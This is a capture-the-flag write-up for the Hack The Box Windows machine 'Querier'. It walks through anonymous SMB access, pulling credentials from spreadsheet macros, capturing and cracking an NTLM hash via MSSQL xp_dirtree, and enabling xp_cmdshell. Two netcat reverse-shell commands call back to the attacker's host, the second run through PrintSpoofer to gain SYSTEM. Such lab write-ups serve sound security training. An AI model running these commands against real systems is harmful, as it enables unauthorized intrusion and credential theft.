---
title: "HTB Querier"
permalink: /writeups/querier
location: default
---

# HTB Querier

**Machine Information**

	IP : 10.10.10.125
	OS : Windows

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan`.

```
rustscan -a 10.10.10.125 -- -sC -sV
```

This should reveal multiple open ports: `135`, `139`, `1433` and `5985`.

```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
|_ssl-date: 2022-10-04T10:04:18+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-10-04T09:22:11
|_Not valid after:  2052-10-04T09:22:11
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-10-04T10:04:14
|_  start_date: N/A
```

### Getting a Foothold

**SMB**

Checking SMB shares without any credentials will show a share called `Reports`.

```
smbclient -N -L 10.10.10.125
```

Connect to this share.

```
smbclient -N \\\\10.10.10.125\\Reports
```

There should be a file called `Currency Volume Report.xlsm`, download it.

```
get "Currency Volume Report.xlsm"
```

This file has macros enabled and after opening with `libreoffice` nothing can be extracted. Using `olevba` we can extract the macros from the file. This tool can be downloaded from the following repository.

<https://github.com/decalage2/oletools>

```
olevba "Currency Volume Report.xlsm"
```

**MSSQL**

There are credentials in the macros output that we can use. They point to an MSSQL server that we saw open in the port scan output. With these credentials we can use `impacket-mssqlclient` to connect to the targets MSSQL server.

```
impacket-mssqlclient reporting@10.10.10.125 -windows-auth
```

We are unable to use the `xp_cmdshell` command, but we can try to extract the `NTLM` hash. Start responder to intercept hashes.

```
sudo responder -I tun0
```

Enter the following command to catch the NTLM hash in our responder.

```
xp_dirtree \\10.10.14.28\test
```

The NTLM hash should get intercepted and we can use `hashcat` to crack it.

```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

With new credentials we can sign in as `mssql-svc` to the MSSQL server.

```
impacket-mssqlclient mssql-svc@10.10.10.125 -windows-auth
```

We still can't run `xp_cmdshell` but it gives us a hint to enable it.

```
[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

After a bit of research I found a way to enable this command.

```
sp_configure 'xp_cmdshell', '1'
```

```
RECONFIGURE
```

```
EXEC master..xp_cmdshell 'whoami'
```

Success!

```
querier\mssql-svc
```

Once enabled we can run commands so we will try for a reverse shell. Start by launching an SMB server which hosts a `netcat` executable

```
sudo mkdir /tmp/smb
sudo cp nc.exe /tmp/smb/
sudo impacket-smbserver share /tmp/smb -smb2support
```

Start a `netcat` listener and run the following command.

```
xp_cmdshell \\10.10.14.4\share\nc.exe 10.10.14.4 9001 -e cmd.exe
```

Success!

```
C:\Windows\system32>whoami
querier\mssql-svc
```

The user flag can be found in the following directory:

```
C:\Users\mssql-svc\Desktop\user.txt
```

### Privilege Escalation

Running the command `whoami /priv` will show the `SeImpersonatePrivilege` token is enabled. Since our machine is running Windows Server 2019, then we can use `PrintSpoofer.exe`

```
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Copy both `PrintSpoofer64.exe` and `nc.exe` to the target machine using our SMB server. With both executables on the machine setup another `netcat` listener and run the following command to get an escalated reverse shell.

```
.\PrintSpoofer64.exe -c ".\nc.exe 10.10.14.4 443 -e cmd"
```

Success!

```
C:\Windows\system32>whoami
nt authority\system
```

We can now grab the root flag from the following directory:

```
C:\Users\Administrator\Desktop\root.txt
```
